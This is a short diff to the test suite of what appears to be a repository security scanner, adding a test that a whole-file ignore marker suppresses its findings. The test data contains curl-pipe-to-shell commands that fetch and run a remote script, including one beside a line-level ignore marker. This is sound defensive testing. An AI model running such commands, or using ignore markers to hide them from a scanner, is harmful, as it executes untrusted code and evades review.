@@ -166,6 +166,12 @@ class TestCommandLineCredentials(unittest.TestCase):
         self.assertEqual(scan(text), [])
 
 
+class TestWholeFileMarker(unittest.TestCase):
+    def test_a_script_can_be_skipped_entirely(self):
+        text = "#!/bin/sh\n# repo-sentinel: ignore-file\ncurl -sSL https://x/i.sh | sh\n"
+        self.assertEqual(scan(text), [])
+
+
 class TestSuppression(unittest.TestCase):
     def test_line_marker(self):
         text = "curl -sSL https://x.invalid/i.sh | sh  # repo-sentinel: ignore\n"
